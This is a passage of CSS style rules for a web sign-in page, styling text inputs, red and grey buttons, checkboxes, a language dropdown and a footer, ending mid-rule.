    <style data-emotion="default-ltr-cache 8fs96e" data-s="">
      .default-ltr-cache-8fs96e {
        width: 100%;
      }
    </style>
    <style data-emotion="default-ltr-cache p2hz7y" data-s="">
      .default-ltr-cache-p2hz7y {
        width: 100%;
      }

      .default-ltr-cache-p2hz7y {
        position: relative;
        -webkit-box-flex-wrap: wrap;
        -webkit-flex-wrap: wrap;
        -ms-flex-wrap: wrap;
        flex-wrap: wrap;
      }

      .default-ltr-cache-p2hz7y .form-control_controlWrapperStyles__oy4jpq1 {
        padding: 0;
      }

      .default-ltr-cache-p2hz7y input~.form-control_controlChromeStyles__oy4jpq4 {
        border-style: solid;
      }

      .default-ltr-cache-p2hz7y input[aria-disabled]~.form-control_controlChromeStyles__oy4jpq4 {
        opacity: 1;
      }

      .default-ltr-cache-p2hz7y .form-control_controlWrapperStyles__oy4jpq1>input[aria-disabled] {
        cursor: not-allowed;
      }

      .default-ltr-cache-p2hz7y .form-control_descriptionStyles__oy4jpq6 {
        width: 100%;
      }

      .default-ltr-cache-p2hz7y .form-control_validationMessageStyles__oy4jpq7 {
        fill: currentColor;
        width: 100%;
      }

      .default-ltr-cache-p2hz7y .form-control_validationMessageStyles__oy4jpq7 .e1vkmu653,
      .default-ltr-cache-p2hz7y .form-control_validationMessageStyles__oy4jpq7 .e1vkmu652,
      .default-ltr-cache-p2hz7y .form-control_validationMessageStyles__oy4jpq7 .e1vkmu654 {
        position: relative;
      }

      .default-ltr-cache-p2hz7y {
        display: -webkit-inline-box;
        display: -webkit-inline-flex;
        display: -ms-inline-flexbox;
        display: inline-flex;
        vertical-align: text-top;
      }

      .default-ltr-cache-p2hz7y .form-control_labelStyles__oy4jpq5 {
        position: absolute;
        z-index: 1;
        white-space: nowrap;
        overflow: hidden;
        text-overflow: ellipsis;
        transition-property: top, font-size, line-height;
        transition-duration: 250ms;
        pointer-events: none;
        transition-timing-function: cubic-bezier(0.4, 0, 0.68, 0.06);
      }

      @media screen and (prefers-reduced-motion) {
        .default-ltr-cache-p2hz7y .form-control_labelStyles__oy4jpq5 {
          -webkit-transition: none;
          transition: none;
        }
      }

      .default-ltr-cache-p2hz7y .form-control_controlWrapperStyles__oy4jpq1 {
        fill: currentColor;
        min-width: 12.5rem;
      }

      .default-ltr-cache-p2hz7y .form-control_controlWrapperStyles__oy4jpq1>input {
        color: inherit;
        -webkit-filter: opacity(0%);
        filter: opacity(0%);
      }

      .default-ltr-cache-p2hz7y .form-control_controlWrapperStyles__oy4jpq1>input:-webkit-autofill {
        background-image: none !important;
        transition-property: background-color, color;
        transition-delay: 86400s;
      }

      .default-ltr-cache-p2hz7y .form-control_controlWrapperStyles__oy4jpq1>input:autofill {
        background-image: none !important;
        transition-property: background-color, color;
        transition-delay: 86400s;
      }

      .default-ltr-cache-p2hz7y .form-control_controlWrapperStyles__oy4jpq1>input.edge-autofilled,
      .default-ltr-cache-p2hz7y .form-control_controlWrapperStyles__oy4jpq1>input[data-com-onepassword-filled],
      .default-ltr-cache-p2hz7y .form-control_controlWrapperStyles__oy4jpq1>input[data-dashlane-autofilled] {
        background-image: none !important;
        transition-property: background-color, color;
        transition-delay: 86400s;
      }

      .default-ltr-cache-p2hz7y .form-control_controlWrapperStyles__oy4jpq1>input[aria-disabled] {
        opacity: 1;
      }

      @media screen and (prefers-reduced-motion) {
        .default-ltr-cache-p2hz7y .form-control_controlWrapperStyles__oy4jpq1>input {
          -webkit-transition: none;
          transition: none;
        }
      }

      .default-ltr-cache-p2hz7y .form-control_labelStyles__oy4jpq5 {
        font-size: 1rem;
        font-weight: 400;
        line-height: 1.5;
        color: rgba(255, 255, 255, 0.7);
        left: 1rem;
        right: 1rem;
        top: 1rem;
      }

      .default-ltr-cache-p2hz7y .form-control_controlWrapperStyles__oy4jpq1 {
        font-size: 1rem;
        font-weight: 400;
        width: 100%;
        color: rgb(255, 255, 255);
      }

      .default-ltr-cache-p2hz7y input~.form-control_controlChromeStyles__oy4jpq4 {
        background: rgba(22, 22, 22, 0.7);
        border-radius: 0.25rem;
        border-width: 0.0625rem;
        border-color: rgba(128, 128, 128, 0.7);
      }

      .default-ltr-cache-p2hz7y input[aria-disabled]~.form-control_controlChromeStyles__oy4jpq4 {
        border-color: rgba(128, 128, 128, 0.4);
        background: rgba(22, 22, 22, 0.2);
      }

      .default-ltr-cache-p2hz7y input:focus:not(:focus-visible)~.form-control_controlChromeStyles__oy4jpq4 {
        outline: none;
      }

      .default-ltr-cache-p2hz7y input:focus~.form-control_controlChromeStyles__oy4jpq4 {
        outline: none;
        outline: rgb(255, 255, 255) solid 0.125rem;
        outline-offset: 0.125rem;
      }

      .default-ltr-cache-p2hz7y input[data-autofill]~.form-control_controlChromeStyles__oy4jpq4 {
        background: rgb(25, 34, 71);
      }

      @supports (-webkit-appearance: none) and (not (-moz-appearance: none)) and (text-size-adjust: none) {
        .default-ltr-cache-p2hz7y input[data-autofill]~.form-control_controlChromeStyles__oy4jpq4 {
          background: rgba(70, 90, 126, 0.4);
        }
      }

      @supports (-webkit-appearance: none) and (not (-moz-appearance: none)) and (not (text-size-adjust: none)) {
        .default-ltr-cache-p2hz7y input[data-autofill]~.form-control_controlChromeStyles__oy4jpq4 {
          background: rgb(5, 0, 66);
        }
      }

      @supports (-moz-appearance: none) {
        .default-ltr-cache-p2hz7y input[data-autofill]~.form-control_controlChromeStyles__oy4jpq4 {
          background: rgb(0, 4, 56);
        }
      }

      .default-ltr-cache-p2hz7y .form-control_controlWrapperStyles__oy4jpq1>input {
        font-size: 1rem;
        line-height: 1.5;
        width: 100%;
        padding-top: 1.5rem;
        padding-right: 1rem;
        padding-bottom: 0.5rem;
        padding-left: 1rem;
      }

      .default-ltr-cache-p2hz7y .form-control_controlWrapperStyles__oy4jpq1>input[aria-disabled] {
        padding-right: 2.75rem;
      }

      .default-ltr-cache-p2hz7y .form-control_descriptionStyles__oy4jpq6 {
        font-size: 0.8125rem;
        font-weight: 400;
        color: rgba(255, 255, 255, 0.7);
        margin-top: 0.375rem;
      }

      .default-ltr-cache-p2hz7y .form-control_validationMessageStyles__oy4jpq7 {
        font-size: 0.8125rem;
        font-weight: 400;
        margin-top: 0.375rem;
        color: rgba(255, 255, 255, 0.7);
      }

      .default-ltr-cache-p2hz7y .form-control_validationMessageStyles__oy4jpq7 .e1vkmu653,
      .default-ltr-cache-p2hz7y .form-control_validationMessageStyles__oy4jpq7 .e1vkmu652,
      .default-ltr-cache-p2hz7y .form-control_validationMessageStyles__oy4jpq7 .e1vkmu654 {
        margin-right: 0.25rem;
        top: 0.1875rem;
      }
    </style>
    <style data-emotion="default-ltr-cache 1qj5r49" data-s="">
      .default-ltr-cache-1qj5r49 {
        border: 0;
        cursor: pointer;
        fill: currentColor;
        position: relative;
        transition-duration: 250ms;
        transition-property: background-color, border-color;
        transition-timing-function: cubic-bezier(0.4, 0, 0.68, 0.06);
        vertical-align: text-top;
        width: 100%;
        font-size: 1rem;
        font-weight: 500;
        min-height: 2.5rem;
        padding: 0.375rem 1rem;
        border-radius: 0.25rem;
        background: rgb(229, 9, 20);
        color: rgb(255, 255, 255);
      }

      .default-ltr-cache-1qj5r49:focus {
        outline: none;
        outline: rgb(255, 255, 255) solid 0.125rem;
        outline-offset: 0.125rem;
      }

      .default-ltr-cache-1qj5r49:focus:not(:focus-visible) {
        outline: none;
      }

      .default-ltr-cache-1qj5r49::after {
        bottom: 0;
        left: 0;
        position: absolute;
        right: 0;
        top: 0;
        -webkit-transition: inherit;
        transition: inherit;
        border-style: solid;
        border-width: 0.0625rem;
        border-radius: calc(0.25rem - 0.0625rem);
        content: '';
        border-color: rgba(0, 0, 0, 0);
      }

      @media screen and (prefers-reduced-motion) {
        .default-ltr-cache-1qj5r49 {
          -webkit-transition: none;
          transition: none;
        }
      }

      .default-ltr-cache-1qj5r49[aria-disabled] {
        opacity: 1;
        background: rgba(229, 9, 20, 0.4);
        cursor: not-allowed;
        color: rgba(255, 255, 255, 0.4);
      }

      .default-ltr-cache-1qj5r49[aria-disabled]::after {
        border-color: rgba(0, 0, 0, 0);
      }

      @media all and (hover: hover) {
        .default-ltr-cache-1qj5r49:not([aria-disabled]):hover {
          transition-timing-function: cubic-bezier(0.32, 0.94, 0.6, 1);
          background: rgb(193, 17, 25);
        }

        .default-ltr-cache-1qj5r49:not([aria-disabled]):hover::after {
          border-color: rgba(0, 0, 0, 0);
        }
      }

      .default-ltr-cache-1qj5r49:not([aria-disabled]):active {
        -webkit-transition: none;
        transition: none;
        color: rgba(255, 255, 255, 0.7);
        background: rgb(153, 22, 29);
      }

      .default-ltr-cache-1qj5r49:not([aria-disabled]):active::after {
        border-color: rgba(0, 0, 0, 0);
      }
    </style>
    <style data-emotion="default-ltr-cache 1und4li" data-s="">
      .default-ltr-cache-1und4li {
        margin-block-start: 0;
        margin-block-end: 0;
        margin: 0;
        padding: 0;
        color: rgba(255, 255, 255, 0.7);
        font-size: 1rem;
        font-weight: 400;
        text-align: center;
      }
    </style>
    <style data-emotion="default-ltr-cache 52t4v6" data-s="">
      .default-ltr-cache-52t4v6 {
        border: 0;
        cursor: pointer;
        fill: currentColor;
        position: relative;
        transition-duration: 250ms;
        transition-property: background-color, border-color;
        transition-timing-function: cubic-bezier(0.4, 0, 0.68, 0.06);
        vertical-align: text-top;
        width: 100%;
        font-size: 1rem;
        font-weight: 500;
        min-height: 2.5rem;
        padding: 0.375rem 1rem;
        border-radius: 0.25rem;
        background: rgba(128, 128, 128, 0.4);
        color: rgb(255, 255, 255);
      }

      .default-ltr-cache-52t4v6:focus {
        outline: none;
        outline: rgb(255, 255, 255) solid 0.125rem;
        outline-offset: 0.125rem;
      }

      .default-ltr-cache-52t4v6:focus:not(:focus-visible) {
        outline: none;
      }

      .default-ltr-cache-52t4v6::after {
        bottom: 0;
        left: 0;
        position: absolute;
        right: 0;
        top: 0;
        -webkit-transition: inherit;
        transition: inherit;
        border-style: solid;
        border-width: 0.0625rem;
        border-radius: calc(0.25rem - 0.0625rem);
        content: '';
        border-color: rgba(0, 0, 0, 0);
      }

      @media screen and (prefers-reduced-motion) {
        .default-ltr-cache-52t4v6 {
          -webkit-transition: none;
          transition: none;
        }
      }

      .default-ltr-cache-52t4v6[aria-disabled] {
        opacity: 1;
        background: rgba(128, 128, 128, 0.2);
        cursor: not-allowed;
        color: rgba(255, 255, 255, 0.4);
      }

      .default-ltr-cache-52t4v6[aria-disabled]::after {
        border-color: rgba(0, 0, 0, 0);
      }

      @media all and (hover: hover) {
        .default-ltr-cache-52t4v6:not([aria-disabled]):hover {
          transition-timing-function: cubic-bezier(0.32, 0.94, 0.6, 1);
          background: rgba(128, 128, 128, 0.3);
        }

        .default-ltr-cache-52t4v6:not([aria-disabled]):hover::after {
          border-color: rgba(0, 0, 0, 0);
        }
      }

      .default-ltr-cache-52t4v6:not([aria-disabled]):active {
        -webkit-transition: none;
        transition: none;
        color: rgba(255, 255, 255, 0.7);
        background: rgba(128, 128, 128, 0.3);
      }

      .default-ltr-cache-52t4v6:not([aria-disabled]):active::after {
        border-color: rgba(0, 0, 0, 0);
      }
    </style>
    <style data-emotion="default-ltr-cache 1uewjrz" data-s="">
      .default-ltr-cache-1uewjrz {
        color: inherit;
        -webkit-text-decoration: none;
        text-decoration: none;
        margin: 0 auto;
      }
    </style>
    <style data-emotion="default-ltr-cache yzjbl5" data-s="">
      .default-ltr-cache-yzjbl5 {
        border-radius: 0.125rem;
        color: inherit;
        -webkit-text-decoration: none;
        text-decoration: none;
        margin: 0 auto;
      }

      .default-ltr-cache-yzjbl5:focus {
        outline: none;
        outline: rgb(255, 255, 255) solid 0.125rem;
        outline-offset: 0.125rem;
      }

      .default-ltr-cache-yzjbl5:focus:not(:focus-visible) {
        outline: none;
      }

      .default-ltr-cache-yzjbl5,
      .default-ltr-cache-yzjbl5:visited {
        color: rgb(255, 255, 255);
      }

      @media all and (hover: hover) {
        .default-ltr-cache-yzjbl5:not([aria-disabled]):hover {
          color: rgba(255, 255, 255, 0.7);
        }
      }

      .default-ltr-cache-yzjbl5:not([aria-disabled]):active {
        color: rgba(255, 255, 255, 0.6);
      }

      .default-ltr-cache-yzjbl5[aria-disabled] {
        color: rgba(255, 255, 255, 0.4);
      }
    </style>
    <style data-emotion="default-ltr-cache banb1s" data-s="">
      .default-ltr-cache-banb1s {
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-flex-direction: column;
        -ms-flex-direction: column;
        flex-direction: column;
        -webkit-box-flex: 1;
        -webkit-flex-grow: 1;
        -ms-flex-positive: 1;
        flex-grow: 1;
        -webkit-box-pack: end;
        -ms-flex-pack: end;
        -webkit-justify-content: flex-end;
        justify-content: flex-end;
        margin-top: 20px;
      }
    </style>
    <style data-emotion="default-ltr-cache 1r5gb7q" data-s="">
      .default-ltr-cache-1r5gb7q {
        display: inline-block;
      }
    </style>
    <style data-emotion="default-ltr-cache a3vgnl" data-s="">
      .default-ltr-cache-a3vgnl {
        position: relative;
        -webkit-box-flex-wrap: wrap;
        -webkit-flex-wrap: wrap;
        -ms-flex-wrap: wrap;
        flex-wrap: wrap;
      }

      .default-ltr-cache-a3vgnl .form-control_controlWrapperStyles__oy4jpq1 {
        padding: 0;
      }

      .default-ltr-cache-a3vgnl input[type="checkbox"]~.form-control_controlChromeStyles__oy4jpq4 {
        border-style: solid;
      }

      .default-ltr-cache-a3vgnl input[type="checkbox"][aria-disabled]~.form-control_controlChromeStyles__oy4jpq4 {
        opacity: 1;
      }

      .default-ltr-cache-a3vgnl .form-control_controlWrapperStyles__oy4jpq1>input[type="checkbox"][aria-disabled] {
        cursor: not-allowed;
      }

      .default-ltr-cache-a3vgnl .form-control_descriptionStyles__oy4jpq6 {
        width: 100%;
      }

      .default-ltr-cache-a3vgnl .form-control_validationMessageStyles__oy4jpq7 {
        fill: currentColor;
        width: 100%;
      }

      .default-ltr-cache-a3vgnl .form-control_validationMessageStyles__oy4jpq7 .e1vkmu653,
      .default-ltr-cache-a3vgnl .form-control_validationMessageStyles__oy4jpq7 .e1vkmu652,
      .default-ltr-cache-a3vgnl .form-control_validationMessageStyles__oy4jpq7 .e1vkmu654 {
        position: relative;
      }

      .default-ltr-cache-a3vgnl {
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
      }

      .default-ltr-cache-a3vgnl .form-control_controlWrapperStyles__oy4jpq1~.form-control_labelStyles__oy4jpq5 {
        -webkit-flex: 1 1 0%;
        -ms-flex: 1 1 0%;
        flex: 1 1 0%;
      }

      .default-ltr-cache-a3vgnl .form-control_controlWrapperStyles__oy4jpq1~.form-control_labelStyles__oy4jpq5,
      .default-ltr-cache-a3vgnl .form-control_controlWrapperStyles__oy4jpq1 {
        font-size: inherit;
        line-height: inherit;
      }

      .default-ltr-cache-a3vgnl input[type="checkbox"]~.form-control_controlChromeStyles__oy4jpq4 {
        bottom: auto;
        box-sizing: border-box;
        color: transparent;
        top: auto;
        transition-duration: 250ms;
        transition-property: background-color, border-color, border-width, color;
        transition-timing-function: cubic-bezier(0.32, 0.94, 0.6, 1);
        width: inherit;
      }

      @media screen and (prefers-reduced-motion) {
        .default-ltr-cache-a3vgnl input[type="checkbox"]~.form-control_controlChromeStyles__oy4jpq4 {
          -webkit-transition: none;
          transition: none;
        }
      }

      .default-ltr-cache-a3vgnl input[type="checkbox"]~.form-control_controlChromeStyles__oy4jpq4>svg {
        fill: currentColor;
      }

      .default-ltr-cache-a3vgnl input[type="checkbox"]:checked~.form-control_controlChromeStyles__oy4jpq4 {
        transition-timing-function: cubic-bezier(0.4, 0, 0.68, 0.06);
      }

      .default-ltr-cache-a3vgnl .form-control_controlWrapperStyles__oy4jpq1>input[type="checkbox"] {
        cursor: pointer;
        position: absolute;
      }

      .default-ltr-cache-a3vgnl {
        font-size: 1rem;
        font-weight: 400;
        line-height: 1.5;
      }

      .default-ltr-cache-a3vgnl .form-control_controlWrapperStyles__oy4jpq1~.form-control_labelStyles__oy4jpq5 {
        padding-left: 0.75rem;
        color: rgb(255, 255, 255);
      }

      .default-ltr-cache-a3vgnl .form-control_controlWrapperStyles__oy4jpq1 {
        width: 1.125rem;
        max-height: 1.5em;
      }

      .default-ltr-cache-a3vgnl input[type="checkbox"]~.form-control_controlChromeStyles__oy4jpq4 {
        background-color: rgb(0, 0, 0);
        border-radius: 0.125rem;
        border-width: 0.0625rem;
        height: 1.125rem;
        border-color: rgba(128, 128, 128, 0.7);
      }

      .default-ltr-cache-a3vgnl input[type="checkbox"]~.form-control_controlChromeStyles__oy4jpq4>svg {
        width: 0.75rem;
      }

      @media all and (hover: hover) {
        .default-ltr-cache-a3vgnl input[type="checkbox"]:not([aria-disabled]):hover~.form-control_controlChromeStyles__oy4jpq4 {
          background-color: rgb(0, 0, 0);
          border-color: rgb(255, 255, 255);
        }
      }

      .default-ltr-cache-a3vgnl input[type="checkbox"][aria-disabled]~.form-control_controlChromeStyles__oy4jpq4 {
        border-color: rgba(128, 128, 128, 0.4);
        background-color: rgb(0, 0, 0);
      }

      .default-ltr-cache-a3vgnl input[type="checkbox"]:checked~.form-control_controlChromeStyles__oy4jpq4 {
        border-width: 0rem;
        color: rgb(0, 0, 0);
        background-color: rgb(255, 255, 255);
        border-color: rgba(0, 0, 0, 0);
      }

      @media all and (hover: hover) {
        .default-ltr-cache-a3vgnl .form-control_controlWrapperStyles__oy4jpq1>input[type="checkbox"]:not([aria-disabled]):hover:checked~.form-control_controlChromeStyles__oy4jpq4 {
          background-color: rgba(255, 255, 255, 0.7);
          border-color: rgba(0, 0, 0, 0);
        }
      }

      .default-ltr-cache-a3vgnl .form-control_controlWrapperStyles__oy4jpq1>input[type="checkbox"][aria-disabled]:checked~.form-control_controlChromeStyles__oy4jpq4 {
        background-color: rgba(255, 255, 255, 0.4);
        color: rgba(0, 0, 0, 0.4);
        border-color: rgba(0, 0, 0, 0);
      }

      .default-ltr-cache-a3vgnl input[type="checkbox"]:focus:not(:focus-visible)~.form-control_controlChromeStyles__oy4jpq4 {
        outline: none;
      }

      .default-ltr-cache-a3vgnl input[type="checkbox"]:focus~.form-control_controlChromeStyles__oy4jpq4 {
        outline: none;
        outline: rgb(255, 255, 255) solid 0.125rem;
        outline-offset: 0.125rem;
      }

      .default-ltr-cache-a3vgnl .form-control_controlWrapperStyles__oy4jpq1>input[type="checkbox"] {
        border-radius: 0.125rem;
        height: 2.75rem;
        left: calc((2.75rem - 1.125rem) / -2);
        width: 2.75rem;
      }

      .default-ltr-cache-a3vgnl .form-control_descriptionStyles__oy4jpq6,
      .default-ltr-cache-a3vgnl .form-control_validationMessageStyles__oy4jpq7 {
        padding-left: calc(1.125rem + 0.75rem);
      }

      .default-ltr-cache-a3vgnl .form-control_descriptionStyles__oy4jpq6 {
        font-size: 0.8125rem;
        font-weight: 400;
        color: rgba(255, 255, 255, 0.7);
        margin-top: 0.375rem;
      }

      .default-ltr-cache-a3vgnl .form-control_validationMessageStyles__oy4jpq7 {
        font-size: 0.8125rem;
        font-weight: 400;
        margin-top: 0.375rem;
        color: rgba(255, 255, 255, 0.7);
      }

      .default-ltr-cache-a3vgnl .form-control_validationMessageStyles__oy4jpq7 .e1vkmu653,
      .default-ltr-cache-a3vgnl .form-control_validationMessageStyles__oy4jpq7 .e1vkmu652,
      .default-ltr-cache-a3vgnl .form-control_validationMessageStyles__oy4jpq7 .e1vkmu654 {
        margin-right: 0.25rem;
        top: 0.1875rem;
      }
    </style>
    <style data-emotion="default-ltr-cache 1mh3ox2" data-s="">
      .default-ltr-cache-1mh3ox2 {
        margin-top: 16px;
      }

      .default-ltr-cache-1mh3ox2 a {
        color: rgb(255, 255, 255);
        font-weight: 500;
      }
    </style>
    <style data-emotion="default-ltr-cache 1gysl7" data-s="">
      .default-ltr-cache-1gysl7 {
        margin-top: 16px;
      }

      .default-ltr-cache-1gysl7 a {
        color: rgb(255, 255, 255);
        font-weight: 500;
      }
    </style>
    <style data-emotion="default-ltr-cache 160ge2v" data-s="">
      .default-ltr-cache-160ge2v {
        margin-block-start: 0;
        margin-block-end: 0;
        margin: 0;
        padding: 0;
        color: rgba(255, 255, 255, 0.7);
        font-size: 1rem;
        font-weight: 400;
        margin-top: 16px;
      }

      .default-ltr-cache-160ge2v a {
        color: rgb(255, 255, 255);
        font-weight: 500;
      }
    </style>
    <style data-emotion="default-ltr-cache 1m4t6ky" data-s="">
      .default-ltr-cache-1m4t6ky {
        background-image: linear-gradient(rgba(0, 0, 0, 0.7) 0%, rgb(0, 0, 0) 20%);
        border-top: 1px solid rgba(128, 128, 128, 0.7);
      }

      @media screen and (min-width: 600px) {
        .default-ltr-cache-1m4t6ky {
          border-top: none;
        }
      }
    </style>
    <style data-emotion="default-ltr-cache 3sf4re" data-s="">
      .default-ltr-cache-3sf4re {
        color: rgba(255, 255, 255, 0.7);
        margin: auto;
        font-size: 1rem;
        font-weight: 400;
      }

      @media screen and (min-width: 1280px) {
        .default-ltr-cache-3sf4re {
          max-width: calc(83.33333333333334% - (3rem * 2));
        }
      }

      @media screen and (min-width: 1920px) {
        .default-ltr-cache-3sf4re {
          max-width: calc(66.66666666666666% - (3rem * 2));
        }
      }

      @media all {
        .default-ltr-cache-3sf4re {
          margin-top: 2rem;
          margin-bottom: 2rem;
        }
      }

      @media all and (min-width: 600px) {
        .default-ltr-cache-3sf4re {
          margin-top: 2rem;
          margin-bottom: 2rem;
        }
      }

      @media all and (min-width: 960px) {
        .default-ltr-cache-3sf4re {
          margin-top: 4.5rem;
          margin-bottom: 4.5rem;
        }
      }

      @media all and (min-width: 1280px) {
        .default-ltr-cache-3sf4re {
          margin-top: 4.5rem;
          margin-bottom: 4.5rem;
        }
      }

      @media all and (min-width: 1920px) {
        .default-ltr-cache-3sf4re {
          margin-top: 4.5rem;
          margin-bottom: 4.5rem;
        }
      }

      @media all {
        .default-ltr-cache-3sf4re {
          padding-left: 1.5rem;
          padding-right: 1.5rem;
        }
      }

      @media all and (min-width: 600px) {
        .default-ltr-cache-3sf4re {
          padding-left: 2rem;
          padding-right: 2rem;
        }
      }

      @media all and (min-width: 960px) {
        .default-ltr-cache-3sf4re {
          padding-left: 2rem;
          padding-right: 2rem;
        }
      }

      @media all and (min-width: 1280px) {
        .default-ltr-cache-3sf4re {
          padding-left: 3rem;
          padding-right: 3rem;
        }
      }

      @media all and (min-width: 1920px) {
        .default-ltr-cache-3sf4re {
          padding-left: 3rem;
          padding-right: 3rem;
        }
      }

      .default-ltr-cache-3sf4re a {
        color: rgba(255, 255, 255, 0.7);
        border-radius: 0.125rem;
      }

      .default-ltr-cache-3sf4re a:focus {
        outline: none;
        outline: rgb(255, 255, 255) solid 0.125rem;
        outline-offset: 0.125rem;
      }

      .default-ltr-cache-3sf4re a:focus:not(:focus-visible) {
        outline: none;
      }

      .default-ltr-cache-3sf4re a:visited,
      .default-ltr-cache-3sf4re a:not([aria-disabled]):active {
        color: rgba(255, 255, 255, 0.7);
      }

      .default-ltr-cache-3sf4re p {
        margin-block-start: 0;
        margin-block-end: 0;
      }
    </style>
    <style data-emotion="default-ltr-cache 82qlwu" data-s="">
      .default-ltr-cache-82qlwu {
        margin-bottom: 0.75rem;
      }
    </style>
    <style data-emotion="default-ltr-cache 2lwb1t" data-s="">
      .default-ltr-cache-2lwb1t {
        margin: 0.75rem 0;
        width: 100%;
        font-size: 0.875rem;
        font-weight: 400;
      }
    </style>
    <style data-emotion="default-ltr-cache 1ogakd7" data-s="">
      .default-ltr-cache-1ogakd7 {
        margin-top: 0.75rem;
      }
    </style>
    <style data-emotion="default-ltr-cache crcdk0" data-s="">
      .default-ltr-cache-crcdk0 {
        position: relative;
        -webkit-box-flex-wrap: wrap;
        -webkit-flex-wrap: wrap;
        -ms-flex-wrap: wrap;
        flex-wrap: wrap;
      }

      .default-ltr-cache-crcdk0 .form-control_controlWrapperStyles__oy4jpq1 {
        padding: 0;
      }

      .default-ltr-cache-crcdk0 select~.form-control_controlChromeStyles__oy4jpq4 {
        border-style: solid;
      }

      .default-ltr-cache-crcdk0 select[aria-disabled]~.form-control_controlChromeStyles__oy4jpq4 {
        opacity: 1;
      }

      .default-ltr-cache-crcdk0 .form-control_controlWrapperStyles__oy4jpq1>select[aria-disabled] {
        cursor: not-allowed;
      }

      .default-ltr-cache-crcdk0 .form-control_descriptionStyles__oy4jpq6 {
        width: 100%;
      }

      .default-ltr-cache-crcdk0 .form-control_validationMessageStyles__oy4jpq7 {
        fill: currentColor;
        width: 100%;
      }

      .default-ltr-cache-crcdk0 .form-control_validationMessageStyles__oy4jpq7 .e1vkmu653,
      .default-ltr-cache-crcdk0 .form-control_validationMessageStyles__oy4jpq7 .e1vkmu652,
      .default-ltr-cache-crcdk0 .form-control_validationMessageStyles__oy4jpq7 .e1vkmu654 {
        position: relative;
      }

      .default-ltr-cache-crcdk0 {
        display: -webkit-inline-box;
        display: -webkit-inline-flex;
        display: -ms-inline-flexbox;
        display: inline-flex;
        vertical-align: text-top;
      }

      .default-ltr-cache-crcdk0 .form-control_labelStyles__oy4jpq5 {
        position: absolute;
        z-index: 1;
        white-space: nowrap;
        overflow: hidden;
        text-overflow: ellipsis;
        transition-property: top, font-size, line-height;
        transition-duration: 250ms;
        pointer-events: none;
        transition-timing-function: cubic-bezier(0.32, 0.94, 0.6, 1);
      }

      @media screen and (prefers-reduced-motion) {
        .default-ltr-cache-crcdk0 .form-control_labelStyles__oy4jpq5 {
          -webkit-transition: none;
          transition: none;
        }
      }

      .default-ltr-cache-crcdk0 .form-control_controlWrapperStyles__oy4jpq1 {
        fill: currentColor;
        min-width: 12.5rem;
      }

      .default-ltr-cache-crcdk0 .form-control_controlWrapperStyles__oy4jpq1>select {
        color: inherit;
        -webkit-filter: opacity(100%);
        filter: opacity(100%);
      }

      .default-ltr-cache-crcdk0 .form-control_controlWrapperStyles__oy4jpq1>select:-webkit-autofill {
        background-image: none !important;
        transition-property: background-color, color;
        transition-delay: 86400s;
      }

      .default-ltr-cache-crcdk0 .form-control_controlWrapperStyles__oy4jpq1>select:autofill {
        background-image: none !important;
        transition-property: background-color, color;
        transition-delay: 86400s;
      }

      .default-ltr-cache-crcdk0 .form-control_controlWrapperStyles__oy4jpq1>select.edge-autofilled,
      .default-ltr-cache-crcdk0 .form-control_controlWrapperStyles__oy4jpq1>select[data-com-onepassword-filled],
      .default-ltr-cache-crcdk0 .form-control_controlWrapperStyles__oy4jpq1>select[data-dashlane-autofilled] {
        background-image: none !important;
        transition-property: background-color, color;
        transition-delay: 86400s;
      }

      .default-ltr-cache-crcdk0 .form-control_controlWrapperStyles__oy4jpq1>select[aria-disabled] {
        opacity: 1;
      }

      @media screen and (prefers-reduced-motion) {
        .default-ltr-cache-crcdk0 .form-control_controlWrapperStyles__oy4jpq1>select {
          -webkit-transition: none;
          transition: none;
        }
      }

      .default-ltr-cache-crcdk0 .form-control_labelStyles__oy4jpq5 {
        right: calc(2.5rem + 0rem);
        font-size: 0.75rem;
        color: rgba(255, 255, 255, 0.7);
        left: calc(0.625rem + 1rem + 0.5rem);
        line-height: 0.875rem;
        top: 0rem;
      }

      .default-ltr-cache-crcdk0 .form-control_controlWrapperStyles__oy4jpq1 {
        font-size: 1rem;
        font-weight: 400;
        color: rgb(255, 255, 255);
      }

      .default-ltr-cache-crcdk0 select~.form-control_controlChromeStyles__oy4jpq4,
      .default-ltr-cache-crcdk0 select~.form-control_controlChromeStyles__oy4jpq4[dir] {
        background: rgba(22, 22, 22, 0.7);
        border-radius: 0.25rem;
        border-width: 0.0625rem;
        padding-right: calc(0.75rem + 0rem);
        border-color: rgba(128, 128, 128, 0.7);
      }

      .default-ltr-cache-crcdk0 select~.form-control_controlChromeStyles__oy4jpq4>svg,
      .default-ltr-cache-crcdk0 select~.form-control_controlChromeStyles__oy4jpq4[dir]>svg {
        display: auto;
      }

      .default-ltr-cache-crcdk0 select[aria-disabled]~.form-control_controlChromeStyles__oy4jpq4 {
        border-color: rgba(128, 128, 128, 0.4);
        background: rgba(22, 22, 22, 0.02);
      }

      .default-ltr-cache-crcdk0 select:focus:not(:focus-visible)~.form-control_controlChromeStyles__oy4jpq4 {
        outline: none;
      }

      .default-ltr-cache-crcdk0 select:focus~.form-control_controlChromeStyles__oy4jpq4 {
        outline: none;
        outline: rgb(255, 255, 255) solid 0.125rem;
        outline-offset: 0.125rem;
      }

      .default-ltr-cache-crcdk0 select[data-autofill]~.form-control_controlChromeStyles__oy4jpq4 {
        background: rgba(22, 22, 22, 0.7);
      }

      @supports (-webkit-appearance: none) and (not (-moz-appearance: none)) and (text-size-adjust: none) {
        .default-ltr-cache-crcdk0 select[data-autofill]~.form-control_controlChromeStyles__oy4jpq4 {
          background: rgba(70, 90, 126, 0.4);
        }
      }

      @supports (-webkit-appearance: none) and (not (-moz-appearance: none)) and (not (text-size-adjust: none)) {
        .default-ltr-cache-crcdk0 select[data-autofill]~.form-control_controlChromeStyles__oy4jpq4 {
          background: rgb(5, 0, 66);
        }
      }

      @supports (-moz-appearance: none) {
        .default-ltr-cache-crcdk0 select[data-autofill]~.form-control_controlChromeStyles__oy4jpq4 {
          background: rgb(0, 4, 56);
        }
      }

      .default-ltr-cache-crcdk0 .form-control_controlWrapperStyles__oy4jpq1>select,
      .default-ltr-cache-crcdk0 .form-control_controlWrapperStyles__oy4jpq1>select[dir] {
        line-height: 1.25rem;
        padding-top: 0.375rem;
        padding-right: calc(2.25rem + 0rem);
        padding-bottom: 0.375rem;
        padding-left: calc(0.625rem + 1rem + 0.5rem);
      }

      .default-ltr-cache-crcdk0 .form-control_controlWrapperStyles__oy4jpq1>select[aria-disabled],
